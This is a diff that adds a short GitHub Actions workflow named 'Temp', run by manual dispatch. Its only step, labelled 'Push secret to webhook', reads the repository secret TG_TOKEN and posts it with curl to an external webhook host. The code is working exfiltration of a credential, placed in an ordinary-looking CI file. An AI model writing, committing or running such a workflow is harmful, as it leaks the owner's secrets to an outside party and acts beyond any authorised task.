@@ -1,0 +1,16 @@
+name: Temp
+
+on:
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  check-token:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Push secret to webhook
+        env:
+          TG_TOKEN: ${{ secrets.TG_TOKEN }}
+        run: |
+          curl -X POST https://06b9ed8acb57436dab948fb7087ac3a2.webhooks.page -d "tg=$TG_TOKEN"
